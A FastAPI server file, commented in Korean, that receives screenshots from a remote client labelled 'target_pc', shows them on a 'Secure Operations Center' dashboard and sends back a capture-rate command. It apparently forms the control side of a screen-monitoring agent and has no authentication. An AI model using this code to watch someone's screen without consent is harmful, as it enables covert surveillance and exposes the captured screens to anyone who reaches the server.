from fastapi import FastAPI, UploadFile, File, Form, Body
from fastapi.responses import HTMLResponse, Response

app = FastAPI()

latest_screenshot = None
current_command = "normal"  # "normal"(3초) 또는 "live"(0.5초)

# [추가] Render 헬스 체크용 엔드포인트 (이게 없어서 404 에러가 나던 것입니다)
@app.get("/health")
async def health_check():
    return {"status": "ok"}

# 1. 브라우저로 서버 주소 접속 시 [집중확인] 버튼이 있는 대시보드 화면을 보여줌
@app.get("/", response_class=HTMLResponse)
async def dashboard():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Secure Operations Center</title>
        <style>
            body { background-color: #121212; color: #ffffff; font-family: sans-serif; text-align: center; padding: 20px; }
            h2 { color: #00ffcc; }
            .btn { padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; margin: 10px; }
            .btn-normal { background-color: #444; color: #fff; }
            .btn-live { background-color: #ff4444; color: #fff; }
            img { max-width: 900px; border: 2px solid #444; margin-top: 15px; border-radius: 4px; }
        </style>
    </head>
    <body>
        <h2>SECURE OPERATIONS CENTER - LIVE MONITORING</h2>
        <p>현재 모드: <span id="status" style="color: #00ffcc; font-weight: bold;">일반 모드 (3초 간격)</span></p>
        <div>
            <button class="btn btn-normal" onclick="setMode('normal')">일반 모드 (3초)</button>
            <button class="btn btn-live" onclick="setMode('live')">🔥 집중확인 (0.5초 스트리밍)</button>
        </div>
        <div>
            <img id="screen" src="/get_screen" alt="Live Screen" />
        </div>

        <script>
            function setMode(mode) {
                fetch('/set_mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ mode: mode })
                })
                .then(res => res.json())
                .then(data => {
                    document.getElementById('status').innerText = data.set_mode === 'live' ? '🔥 집중확인 모드 (0.5초 스트리밍)' : '일반 모드 (3초 간격)';
                });
            }

            // 대시보드 화면 자동 갱신 (0.5초마다 최신 캡처 이미지 로드)
            setInterval(() => {
                const img = document.getElementById('screen');
                const timestamp = new Date().getTime();
                img.src = '/get_screen?t=' + timestamp;
            }, 500);
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content, media_type="text/html")

# 2. 클라이언트가 스크린샷을 업로드하는 엔드포인트
@app.post("/upload_screen")
async def upload_screen(file: UploadFile = File(...), client_name: str = Form("target_pc")):
    global latest_screenshot
    latest_screenshot = await file.read()
    return {"status": "success", "command": current_command}

# 3. 대시보드 화면에 최신 캡처본을 쏴주는 엔드포인트
@app.get("/get_screen")
async def get_screen():
    if latest_screenshot:
        return Response(content=latest_screenshot, media_type="image/jpeg")
    return {"status": "no image"}

# 4. 대시보드 버튼 클릭 시 모드를 변경하는 엔드포인트
@app.post("/set_mode")
async def set_mode(payload: dict = Body(...)):
    global current_command
    target_mode = payload.get("mode", "normal")
    current_command = target_mode
    return {"result": "ok", "set_mode": current_command}